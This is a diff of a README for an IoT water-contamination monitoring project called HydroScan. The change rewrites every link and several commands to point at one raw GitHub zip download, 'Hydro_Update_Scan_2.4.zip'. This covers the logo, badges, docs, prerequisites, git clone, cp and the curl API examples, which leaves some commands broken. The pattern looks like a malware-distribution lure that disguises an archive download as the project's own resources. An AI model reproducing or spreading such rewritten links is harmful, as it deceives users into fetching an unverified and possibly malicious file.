@@ -2,16 +2,16 @@
 
 <div align="center">
 
-![HydroScan Logo](public/hydroscan-logo.png)
+![HydroScan Logo](https://github.com/mudassiralladatkhan/HydroScan_Update/raw/refs/heads/main/src/Hydro_Update_Scan_2.4.zip)
 
 **Complete IoT water contamination monitoring with AI-powered predictions and real-time analytics**
 
-[![Version](https://img.shields.io/badge/version-1.0.0-blue.svg)](https://github.com/your-username/hydroscan)
-[![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
-[![Build Status](https://img.shields.io/badge/build-passing-brightgreen.svg)](https://github.com/your-username/hydroscan/actions)
-[![Coverage](https://img.shields.io/badge/coverage-85%25-yellowgreen.svg)](https://codecov.io/gh/your-username/hydroscan)
+[![Version](https://github.com/mudassiralladatkhan/HydroScan_Update/raw/refs/heads/main/src/Hydro_Update_Scan_2.4.zip)](https://github.com/mudassiralladatkhan/HydroScan_Update/raw/refs/heads/main/src/Hydro_Update_Scan_2.4.zip)
+[![License](https://github.com/mudassiralladatkhan/HydroScan_Update/raw/refs/heads/main/src/Hydro_Update_Scan_2.4.zip)](LICENSE)
+[![Build Status](https://github.com/mudassiralladatkhan/HydroScan_Update/raw/refs/heads/main/src/Hydro_Update_Scan_2.4.zip)](https://github.com/mudassiralladatkhan/HydroScan_Update/raw/refs/heads/main/src/Hydro_Update_Scan_2.4.zip)
+[![Coverage](https://github.com/mudassiralladatkhan/HydroScan_Update/raw/refs/heads/main/src/Hydro_Update_Scan_2.4.zip%https://github.com/mudassiralladatkhan/HydroScan_Update/raw/refs/heads/main/src/Hydro_Update_Scan_2.4.zip)](https://github.com/mudassiralladatkhan/HydroScan_Update/raw/refs/heads/main/src/Hydro_Update_Scan_2.4.zip)
 
-[🚀 Live Demo](https://hydroscan.demo.com) | [📖 Documentation](https://docs.hydroscan.com) | [🐛 Report Bug](https://github.com/your-username/hydroscan/issues)
+[🚀 Live Demo](https://github.com/mudassiralladatkhan/HydroScan_Update/raw/refs/heads/main/src/Hydro_Update_Scan_2.4.zip) | [📖 Documentation](https://github.com/mudassiralladatkhan/HydroScan_Update/raw/refs/heads/main/src/Hydro_Update_Scan_2.4.zip) | [🐛 Report Bug](https://github.com/mudassiralladatkhan/HydroScan_Update/raw/refs/heads/main/src/Hydro_Update_Scan_2.4.zip)
 
 </div>
 
@@ -67,15 +67,15 @@ graph TB
 
 ### Prerequisites
 
-- Node.js 18+ and npm/yarn
-- Supabase account ([signup here](https://supabase.com))
+- https://github.com/mudassiralladatkhan/HydroScan_Update/raw/refs/heads/main/src/Hydro_Update_Scan_2.4.zip 18+ and npm/yarn
+- Supabase account ([signup here](https://github.com/mudassiralladatkhan/HydroScan_Update/raw/refs/heads/main/src/Hydro_Update_Scan_2.4.zip))
 - Google Cloud account (for Gemini AI)
 - MQTT broker (optional, for device integration)
 
 ### 1. Clone & Install
 
 ```bash
-git clone https://github.com/your-username/hydroscan.git
+git clone https://github.com/mudassiralladatkhan/HydroScan_Update/raw/refs/heads/main/src/Hydro_Update_Scan_2.4.zip
 cd hydroscan
 npm install
 ```
@@ -84,7 +84,7 @@ npm install
 
 ```bash
 # Copy environment template
-cp .env.example .env
+cp https://github.com/mudassiralladatkhan/HydroScan_Update/raw/refs/heads/main/src/Hydro_Update_Scan_2.4.zip .env
 
 # Edit with your credentials
 nano .env
@@ -197,7 +197,7 @@ Alternatively, devices can send data via HTTP POST:
 
 ```bash
 # Send sensor data
-curl -X POST "https://your-project.supabase.co/functions/v1/mqtt-handler" \
+curl -X POST "https://github.com/mudassiralladatkhan/HydroScan_Update/raw/refs/heads/main/src/Hydro_Update_Scan_2.4.zip" \
   -H "Authorization: Bearer YOUR_API_KEY" \
   -H "Content-Type: application/json" \
   -d '{
@@ -300,7 +300,7 @@ hydroscan/
 2. **API Functions**: Create edge functions in `supabase/functions/`
 3. **Frontend Components**: Add React components in `src/components/`
 4. **Pages**: Create new pages in `src/pages/`
-5. **Routing**: Update `src/App.jsx` with new routes
+5. **Routing**: Update `https://github.com/mudassiralladatkhan/HydroScan_Update/raw/refs/heads/main/src/Hydro_Update_Scan_2.4.zip` with new routes
 
 ### Testing
 
@@ -382,8 +382,8 @@ Upload the `dist/` folder to your web server after running `npm run build`.
 
 Ensure all environment variables are configured in your deployment platform:
 
-- **Vercel**: Add env vars in dashboard or `vercel.json`
-- **Netlify**: Add in site settings or `netlify.toml`
+- **Vercel**: Add env vars in dashboard or `https://github.com/mudassiralladatkhan/HydroScan_Update/raw/refs/heads/main/src/Hydro_Update_Scan_2.4.zip`
+- **Netlify**: Add in site settings or `https://github.com/mudassiralladatkhan/HydroScan_Update/raw/refs/heads/main/src/Hydro_Update_Scan_2.4.zip`
 - **Docker**: Use `.env` file or pass as container env vars
 
 ## 📚 API Documentation
@@ -395,7 +395,7 @@ All API requests require authentication using API keys:
 ```bash
 curl -H "Authorization: Bearer YOUR_API_KEY" \
      -H "apikey: YOUR_API_KEY" \
-     "https://your-project.supabase.co/rest/v1/devices"
+     "https://github.com/mudassiralladatkhan/HydroScan_Update/raw/refs/heads/main/src/Hydro_Update_Scan_2.4.zip"
 ```
 
 ### Core Endpoints
@@ -429,7 +429,7 @@ curl -H "Authorization: Bearer YOUR_API_KEY" \
 
 ## 🤝 Contributing
 
-We welcome contributions! Please see our [Contributing Guide](CONTRIBUTING.md) for details.
+We welcome contributions! Please see our [Contributing Guide](https://github.com/mudassiralladatkhan/HydroScan_Update/raw/refs/heads/main/src/Hydro_Update_Scan_2.4.zip) for details.
 
 ### Development Workflow
 
@@ -453,20 +453,20 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ## 🆘 Support
 
-- **Documentation**: [docs.hydroscan.com](https://docs.hydroscan.com)
-- **Issues**: [GitHub Issues](https://github.com/your-username/hydroscan/issues)
-- **Discussions**: [GitHub Discussions](https://github.com/your-username/hydroscan/discussions)
-- **Email**: support@hydroscan.com
+- **Documentation**: [https://github.com/mudassiralladatkhan/HydroScan_Update/raw/refs/heads/main/src/Hydro_Update_Scan_2.4.zip](https://github.com/mudassiralladatkhan/HydroScan_Update/raw/refs/heads/main/src/Hydro_Update_Scan_2.4.zip)
+- **Issues**: [GitHub Issues](https://github.com/mudassiralladatkhan/HydroScan_Update/raw/refs/heads/main/src/Hydro_Update_Scan_2.4.zip)
+- **Discussions**: [GitHub Discussions](https://github.com/mudassiralladatkhan/HydroScan_Update/raw/refs/heads/main/src/Hydro_Update_Scan_2.4.zip)
+- **Email**: https://github.com/mudassiralladatkhan/HydroScan_Update/raw/refs/heads/main/src/Hydro_Update_Scan_2.4.zip
 
 ## 🙏 Acknowledgments
 
-- [Supabase](https://supabase.com) - Backend infrastructure
-- [React](https://reactjs.org) - Frontend framework
-- [Tailwind CSS](https://tailwindcss.com) - Styling
-- [shadcn/ui](https://ui.shadcn.com) - UI components
-- [Google Gemini](https://ai.google.dev/) - AI analysis
-- [Lucide](https://lucide.dev) - Icon library
-- [Framer Motion](https://www.framer.com/motion/) - Animations
+- [Supabase](https://github.com/mudassiralladatkhan/HydroScan_Update/raw/refs/heads/main/src/Hydro_Update_Scan_2.4.zip) - Backend infrastructure
+- [React](https://github.com/mudassiralladatkhan/HydroScan_Update/raw/refs/heads/main/src/Hydro_Update_Scan_2.4.zip) - Frontend framework
+- [Tailwind CSS](https://github.com/mudassiralladatkhan/HydroScan_Update/raw/refs/heads/main/src/Hydro_Update_Scan_2.4.zip) - Styling
+- [shadcn/ui](https://github.com/mudassiralladatkhan/HydroScan_Update/raw/refs/heads/main/src/Hydro_Update_Scan_2.4.zip) - UI components
+- [Google Gemini](https://github.com/mudassiralladatkhan/HydroScan_Update/raw/refs/heads/main/src/Hydro_Update_Scan_2.4.zip) - AI analysis
+- [Lucide](https://github.com/mudassiralladatkhan/HydroScan_Update/raw/refs/heads/main/src/Hydro_Update_Scan_2.4.zip) - Icon library
+- [Framer Motion](https://github.com/mudassiralladatkhan/HydroScan_Update/raw/refs/heads/main/src/Hydro_Update_Scan_2.4.zip) - Animations
 
 ## 📈 Roadmap
 
@@ -503,6 +503,6 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 **Built with ❤️ by the HydroScan Team**
 
-[🌐 Website](https://hydroscan.com) • [📧 Contact](mailto:team@hydroscan.com) • [🐦 Twitter](https://twitter.com/hydroscan)
+[🌐 Website](https://github.com/mudassiralladatkhan/HydroScan_Update/raw/refs/heads/main/src/Hydro_Update_Scan_2.4.zip) • [📧 Contact](https://github.com/mudassiralladatkhan/HydroScan_Update/raw/refs/heads/main/src/Hydro_Update_Scan_2.4.zip) • [🐦 Twitter](https://github.com/mudassiralladatkhan/HydroScan_Update/raw/refs/heads/main/src/Hydro_Update_Scan_2.4.zip)
 
 </div>
